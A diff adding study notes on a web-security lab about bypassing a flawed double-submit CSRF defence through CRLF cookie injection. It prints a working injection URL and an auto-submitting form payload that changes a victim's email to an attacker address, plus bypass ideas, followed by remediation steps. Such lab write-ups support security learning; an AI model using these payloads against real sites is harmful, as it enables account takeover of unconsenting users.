@@ -2265,3 +2265,540 @@ controls csrfKey → controls validation
 ---
 
 Controllable CSRF cookie + header injection = full account takeover
+
+---
+
+# 🐞 Lab-6 — CSRF → Double Submit Cookie Bypass (CRLF Injection Chain)
+
+---
+
+## 🔥 Overview (Full Theory + Insight)
+
+This lab demonstrates a CSRF vulnerability caused by an insecure **double submit cookie mechanism**, combined with a **CRLF (header) injection flaw**.
+
+---
+
+Normally:
+
+CSRF protection ensures that requests originate from the legitimate user.
+
+---
+
+However, in this lab:
+
+✔ CSRF token is stored in both cookie and request  
+❌ Server only checks if they are equal  
+❌ No session binding or ownership validation  
+
+---
+
+👉 Since both values are controlled by the client:
+
+An attacker can manipulate both → bypass protection
+
+---
+
+## 🧠 🟦 Core Idea
+
+If attacker controls both cookie and request token → CSRF protection fails
+
+---
+
+## 🧠 🟥 Key Exploit
+
+```
+csrf=fake
+```
+
+---
+
+👉 Works because:
+
+```
+cookie.csrf == request.csrf
+```
+
+---
+
+## 🔍 🧠 What Is This Topic?
+
+### 🔹 Double Submit CSRF (Broken Implementation)
+
+A flawed CSRF defense where the same token is stored in cookie and request, but not validated against session
+
+---
+
+## 🧪 🟩 Lab Walkthrough (STEP-BY-STEP)
+
+---
+
+### 🧩 Step 1 — Capture Request
+
+Login:
+
+```
+wiener : peter
+```
+
+---
+
+Captured request:
+
+```
+POST /my-account/change-email
+
+Cookie:
+session=ABC; csrf=XYZ
+
+Body:
+csrf=XYZ&email=test@mail.com
+```
+
+---
+
+### 🧠 Observation
+
+```
+CSRF token exists in both cookie and request
+```
+
+---
+
+### 🧩 Step 2 — Test Validation Logic
+
+Modify token:
+
+```
+csrf=INVALID
+```
+
+---
+
+👉 Result:
+
+```
+Request rejected
+```
+
+---
+
+Keep both same:
+
+```
+csrf=XYZ (cookie + body)
+```
+
+---
+
+👉 Result:
+
+✔ Request accepted  
+
+---
+
+### 🧠 Insight
+
+```
+Server ONLY checks equality
+```
+
+---
+
+### 🧩 Step 3 — Discover Cookie Injection
+
+Test endpoint:
+
+```
+/?search=test
+```
+
+---
+
+Response:
+
+```
+Set-Cookie: search=test
+```
+
+---
+
+### 🧠 Observation
+
+```
+User input reflected into Set-Cookie header
+```
+
+---
+
+👉 CRLF Injection possible
+
+---
+
+### 🧩 Step 4 — Inject Fake CSRF Cookie
+
+```
+/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
+```
+
+---
+
+👉 Victim browser stores:
+
+```
+csrf=fake
+```
+
+---
+
+### 🧩 Step 5 — Build CSRF Exploit
+
+```
+<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
+  <input type="hidden" name="email" value="attacker@evil.com">
+  <input type="hidden" name="csrf" value="fake">
+</form>
+```
+
+---
+
+### 🧩 Step 6 — Combine Injection + Exploit
+
+```
+<img src="https://LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"
+onerror="document.forms[0].submit();">
+```
+
+---
+
+### 🧩 Step 7 — Deliver Exploit
+
+```
+Victim loads attacker page
+```
+
+---
+
+👉 Execution flow:
+
+✔ Cookie injected  
+✔ Form auto-submitted  
+✔ Request accepted  
+
+---
+
+### 🧩 Step 8 — Result
+
+```
+Email changed via CSRF bypass
+```
+
+---
+
+## 💣 🟨 Final Payload
+
+```
+<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
+  <input type="hidden" name="email" value="attacker@evil.com">
+  <input type="hidden" name="csrf" value="fake">
+</form>
+
+<img src="https://LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"
+onerror="document.forms[0].submit();">
+```
+
+---
+
+## 💣 🟨 Payload Breakdown (Easy)
+
+---
+
+### 🔹 CSRF Token
+
+```
+csrf=fake
+```
+
+---
+
+### 🔹 Cookie Injection
+
+```
+%0d%0a → CRLF → new header
+Set-Cookie: csrf=fake
+```
+
+---
+
+### 🔹 Form
+
+```
+<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
+```
+
+---
+
+### 🔹 IMG Trigger
+
+```
+<img src="...">
+```
+
+---
+
+✔ Sends request automatically  
+
+---
+
+### 🔹 Auto Submit
+
+```
+onerror="document.forms[0].submit();"
+```
+
+---
+
+✔ Executes after cookie injection  
+
+---
+
+## 🌍 🟥 Real-World Scenarios
+
+---
+
+### 🔥 Scenario 1 — Banking Application
+
+```
+Inject csrf → transfer money
+```
+
+---
+
+### 🔥 Scenario 2 — Account Takeover
+
+```
+Change email → reset password
+```
+
+---
+
+### 🔥 Scenario 3 — Admin Abuse
+
+```
+Modify roles / permissions
+```
+
+---
+
+### 🔥 Scenario 4 — API Exploitation
+
+```
+Perform sensitive actions via forged requests
+```
+
+---
+
+### 🔥 Scenario 5 — Multi-Step Chain
+
+```
+CRLF Injection → Cookie Control → CSRF Bypass
+```
+
+---
+
+## ⚔️ 🧠 Attack Chain
+
+---
+
+1️⃣ Capture request  
+2️⃣ Identify double submit mechanism  
+3️⃣ Confirm equality check  
+4️⃣ Find CRLF injection  
+5️⃣ Inject fake CSRF cookie  
+6️⃣ Build exploit page  
+7️⃣ Auto-submit request  
+8️⃣ Victim executes payload  
+9️⃣ Action performed  
+
+---
+
+## 🎯 High-Value Endpoints
+
+---
+
+### 🔹 Critical
+
+```
+/change-email
+/change-password
+/reset-password
+/add-admin
+```
+
+---
+
+### 🔹 Financial
+
+```
+/transfer-money
+/add-payment-method
+```
+
+---
+
+### 🔹 Account
+
+```
+/update-profile
+/delete-account
+```
+
+---
+
+### 🔹 Security
+
+```
+/2fa/enable
+/api-key/regenerate
+```
+
+---
+
+## ⚠️ 🟥 Real-World Limitations + Bypass
+
+---
+
+### ❌ Token Bound to Session
+
+👉 Attack fails
+
+---
+
+### ❌ No Header Injection
+
+👉 Cannot set cookie
+
+---
+
+### ❌ SameSite=Strict
+
+👉 Cookie not sent
+
+---
+
+### ❌ Input Sanitization
+
+👉 CRLF blocked
+
+---
+
+### ✅ Bypass Ideas
+
+```
+Find alternate injection points
+Use subdomain cookie injection
+Chain with XSS
+```
+
+---
+
+## 🛡️ 🔒 Remediation
+
+---
+
+### 🔴 Root Problem
+
+Server trusts client-controlled token without validation
+
+---
+
+### ✅ Fix 1 — Use Server-Side Tokens
+
+```
+Store token on server
+```
+
+---
+
+### ✅ Fix 2 — Bind Token to Session
+
+```
+Token must match user session
+```
+
+---
+
+### ✅ Fix 3 — Prevent Header Injection
+
+```
+Sanitize CRLF (\r\n)
+```
+
+---
+
+### ✅ Fix 4 — Use SameSite Cookies
+
+```
+SameSite=Strict or Lax
+```
+
+---
+
+### ✅ Fix 5 — Validate Origin / Referer
+
+```
+Block cross-site requests
+```
+
+---
+
+### ✅ Fix 6 — Regenerate Tokens
+
+```
+Per session or per request
+```
+
+---
+
+## 🧠 🟪 Mental Model
+
+---
+
+Secure:
+
+```
+Server validates token
+```
+
+---
+
+Vulnerable:
+
+```
+Client controls token
+```
+
+---
+
+If attacker controls both sides → protection fails  
+
+---
+
+## 🎯 🧠 Final Summary
+
+---
+
+✔ Double submit mechanism implemented incorrectly  
+
+✔ Token equality check without validation  
+
+✔ Cookie injection enables full control  
+
+✔ Complete CSRF bypass achieved  
+
+---
+
+## 🔥 Final One-Liner
+
+---
+
+If attacker controls both cookie and request token → CSRF protection is useless
